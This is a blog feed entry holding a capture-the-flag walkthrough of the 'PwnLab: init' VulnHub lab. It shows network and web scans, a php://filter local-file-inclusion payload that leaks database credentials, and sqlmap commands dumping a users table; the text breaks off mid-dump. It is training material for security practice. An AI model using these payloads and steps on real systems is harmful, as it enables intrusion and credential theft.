<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-08-29T22:10:45+10:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PwnLab: init]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init/"/>
    <updated>2016-08-29T20:46:38+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init</id>
    <content type="html"><![CDATA[<p>&ldquo;Wellcome to \"PwnLab: init\&rdquo;, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/claor,331/">Claor</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: PwnLab: init (<em>10.1.1.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Inclusion vulnerability</li>
<li>Dump DB tables and crack user credentials</li>
<li>Login and upload webshell/Reverse PHP Shell</li>
<li>Bypass File Extension limit</li>
<li>Exploit <code>setuid</code> sticky bit set file/program to privilege escape</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Local File Inclusion vulnerability found and exploited to discover MySQL login information</li>
<li>Login to MySQL DB and download user table to obtain user/pass</li>
<li>Login to Web application as privilege user and upload webshell/PHP reverse shell</li>
<li>Enumeration after get into the target server and escape to different users</li>
<li>Exploit <code>setuid</code> stikcy bit set program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.140  00:0c:29:11:ce:27   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:ee:0a:4f   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.312 seconds <span class="o">(</span>110.73 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.140/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-22 13:17:05 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.140                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 3306/tcp on 10.1.1.140                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.140                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 59968/tcp on 10.1.1.140    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.140
</span><span class='line'>Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35271/udp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          59968/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .5.47-0+deb8u1
</span><span class='line'><span class="p">|</span>   Thread ID: 38
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: ODBCClient, LongPassword, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, Support41Auth
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="p">&amp;</span>amp<span class="p">;</span>AVi2YKInpe-Lv1.3R<span class="p">&amp;</span>amp<span class="p">;</span>d
</span><span class='line'>59968/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:11:CE:27 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.4
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found port 80 and 3306 is open.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.140
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ OSVDB-630: GET IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ SZYEPUYV Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ GET Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ GET /config.php: PHP Config file may contain database IDs and passwords.
</span><span class='line'>+ OSVDB-3268: GET /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: GET /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /login.php: Admin login page/section found.
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, I noticed that <code>/login.php</code> is found which could be the Admin login page, and <code>/images/</code> directory indexing found, and last but not least, <code>/config.php</code> is found which may contain database IDs and passowrds.</p>

<p>Then I use firefox to open the target website and have a look around.</p>

<p>I was hanging on here for quite a while, after trying brute force the login, tring SQL injection and trying brute force directory but all failed&hellip; I finally found a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" title="Local File Inclusion with PHP wrappers">LFI vulnerability</a> on the <code>page</code> parameter.</p>

<p>by exploiting this LFI vulnerability and based on the previous Nickto scan result (<code>config.php</code> is found and may contain DB login):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=config&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>config&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;root@kali:~/myExercises/pwnlab_init#
</span><span class='line'>root@kali:~/myExercises/pwnlab_init# <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> base64 <span class="p">&amp;</span>ndash<span class="p">;</span>decode
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'><span class="nv">$server</span>   <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>localhost<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>root<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>H4u%QJ_H99<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$database</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Users<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, now I got the database ROOT login (<font color="red"><code>root/H4u%QJ_H99</code></font>) and the DB name is <font color="red"><code>Users</code></font>, then I use <code>sqlmap</code> to check target DB</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>tables -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:02:54&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>Database: Users
</span><span class='line'><span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'><span class="p">|</span> users <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 20:02:54
</span></code></pre></td></tr></table></div></figure></p>

<p>Got the table name is <code>users</code>, then dump the table:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>dump -T users -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:03:23&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;user&#39;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;], [u&#39;</span>pass<span class="p">&amp;</span>rsquo<span class="p">;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;]]&amp;hellip;</span>
</span><span class='line'><span class="s1">[20:03:24] [INFO] fetching entries for table &#39;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
</span><span class='line'>Database: Users
</span><span class='line'>Table: users
</span><span class='line'><span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
